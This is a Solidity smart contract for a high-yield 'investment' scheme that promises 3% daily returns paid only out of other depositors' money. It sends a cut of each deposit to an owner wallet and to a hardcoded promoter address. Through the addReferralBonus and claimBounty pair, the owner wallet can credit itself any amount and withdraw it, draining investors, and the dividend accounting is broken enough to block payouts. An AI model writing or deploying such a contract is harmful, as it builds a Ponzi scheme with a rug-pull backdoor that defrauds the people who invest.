```solidity
pragma solidity ^0.4.24;

contract InvestmentContract {
    using SafeMath for uint256;
    
    mapping(address => uint256) public investments;
    mapping(address => uint256) public investmentTimestamps;
    mapping(address => uint256) public withdrawnDividends;
    mapping(address => uint256) public referralBonuses;
    
    uint256 public minimumInvestment = 100000000;
    uint256 public dailyInterestRate = 3;
    uint256 public referralPercentage = 5;
    uint256 public promoterPercentage = 5;
    uint256 public ownerPercentage = 100;
    
    address public owner;
    address public ownerWallet;
    address public promoterWallet;
    
    event Invest(address indexed investor, uint256 amount);
    event Withdraw(address indexed investor, uint256 amount);
    event Bounty(address indexed referrer, uint256 amount);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    
    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }
    
    modifier onlyOwnerWallet() {
        require(msg.sender == ownerWallet);
        _;
    }
    
    constructor(address _ownerWallet) public {
        owner = msg.sender;
        ownerWallet = _ownerWallet;
        promoterWallet = 0xf8EeAe7abe051A0B7a4ec5758af411F870A8Add3;
    }
    
    function transferOwnership(address newOwner, address newOwnerWallet) public onlyOwner {
        require(newOwner != address(0));
        emit OwnershipTransferred(owner, newOwner);
        owner = newOwner;
        ownerWallet = newOwnerWallet;
    }
    
    function() external payable {
        require(msg.value >= minimumInvestment);
        
        if (investments[msg.sender] > 0) {
            if (withdrawDividends()) {
                withdrawnDividends[msg.sender] = 0;
            }
        }
        
        investments[msg.sender] = investments[msg.sender].add(msg.value);
        investmentTimestamps[msg.sender] = block.timestamp;
        
        ownerWallet.transfer(msg.value.mul(ownerPercentage).div(1000));
        promoterWallet.transfer(msg.value.mul(promoterPercentage).div(1000));
        
        emit Invest(msg.sender, msg.value);
    }
    
    function calculateDividends(address investor) public view returns (uint256) {
        uint256 minutesPassed = now.sub(investmentTimestamps[investor]).div(1 minutes);
        uint256 dailyInterest = investments[investor].mul(dailyInterestRate).div(100);
        uint256 dividends = dailyInterest.mul(minutesPassed).div(1440);
        uint256 totalDividends = dividends.sub(withdrawnDividends[investor]);
        return totalDividends;
    }
    
    function withdrawDividends() public returns (bool) {
        require(investmentTimestamps[msg.sender] > 0);
        
        uint256 dividends = calculateDividends(msg.sender);
        
        if (address(this).balance > dividends) {
            if (dividends > 0) {
                withdrawnDividends[msg.sender] = withdrawnDividends[msg.sender].add(dividends);
                msg.sender.transfer(dividends);
                emit Withdraw(msg.sender, dividends);
            }
            return true;
        } else {
            return false;
        }
    }
    
    function claimBounty() public {
        uint256 referralBonus = getReferralBonus(msg.sender);
        if (referralBonus >= minimumInvestment) {
            if (address(this).balance > referralBonus) {
                referralBonuses[msg.sender] = 0;
                msg.sender.transfer(referralBonus);
                emit Bounty(msg.sender, referralBonus);
            }
        }
    }
    
    function myDividends() public view returns (uint256) {
        return calculateDividends(msg.sender);
    }
    
    function getWithdrawnDividends(address investor) public view returns (uint256) {
        return withdrawnDividends[investor];
    }
    
    function getInvestment(address investor) public view returns (uint256) {
        return investments[investor];
    }
    
    function getReferralBonus(address referrer) public view returns (uint256) {
        return referralBonuses[referrer];
    }
    
    function addReferralBonus(address referrer, uint256 amount) public onlyOwnerWallet {
        referralBonuses[referrer] = referralBonuses[referrer].add(amount);
    }
}

library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        assert(c / a == b);
        return c;
    }
    
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a / b;
        return c;
    }
    
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        assert(b <= a);
        return a - b;
    }
    
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        assert(c >= a);
        return c;
    }
}
```